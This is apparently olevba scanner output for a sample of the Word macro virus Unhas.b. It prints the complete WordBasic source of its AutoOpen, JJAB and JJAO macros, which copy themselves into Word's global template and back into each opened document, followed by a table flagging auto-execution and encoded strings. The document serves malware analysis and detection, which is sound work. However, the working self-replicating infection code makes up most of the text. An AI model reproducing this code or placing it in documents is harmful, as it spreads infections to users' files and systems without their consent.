olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Unhas.b-3a1f0571302301333fba041ba6b55b7dba9d5dbc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Unhas.b-3a1f0571302301333fba041ba6b55b7dba9d5dbc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Unhas.b-3a1f0571302301333fba041ba6b55b7dba9d5dbc - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
sMe$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Name:=sMe$, Format:=1
sTMacro$ = sMe$ + ":JJAO"
WordBasic.MacroCopy sTMacro$, "Global:AutoOpen"
sTMacro$ = sMe$ + ":JJAO"
WordBasic.MacroCopy sTMacro$, "Global:JJAO"
sTMacro$ = sMe$ + ":JJAB"
WordBasic.MacroCopy sTMacro$, "Global:JJAB"
WordBasic.FileSaveAll 1, 1
WordBasic.MsgBox "Virus World created (c) 1996 by Ahmad Zakhri", -8
End Sub
-------------------------------------------------------------------------------
VBA MACRO JJAB.bas 
in file: Virus.MSWord.Unhas.b-3a1f0571302301333fba041ba6b55b7dba9d5dbc - OLE stream: 'Macros/VBA/JJAB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
sMe$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Name:=sMe$, Format:=1
sTMacro$ = sMe$ + ":JJAO"
WordBasic.MacroCopy sTMacro$, "Global:AutoOpen"
sTMacro$ = sMe$ + ":JJAO"
WordBasic.MacroCopy sTMacro$, "Global:JJAO"
sTMacro$ = sMe$ + ":JJAB"
WordBasic.MacroCopy sTMacro$, "Global:JJAB"
WordBasic.FileSaveAll 1, 1
WordBasic.MsgBox "Virus World created (c) 1996 by Ahmad Zakhri", -8
End Sub
-------------------------------------------------------------------------------
VBA MACRO JJAO.bas 
in file: Virus.MSWord.Unhas.b-3a1f0571302301333fba041ba6b55b7dba9d5dbc - OLE stream: 'Macros/VBA/JJAO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
sMe$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Name:=sMe$, Format:=1
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:JJAB", sTMacro$
sTMacro$ = sMe$ + ":JJAB"
WordBasic.MacroCopy "Global:JJAB", sTMacro$
sTMacro$ = sMe$ + ":JJAO"
WordBasic.MacroCopy "Global:JJAO", sTMacro$
WordBasic.FileSaveAll 1, 1
WordBasic.MsgBox "Virus World created (c) 1996 by Ahmad Zakhri", -8
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

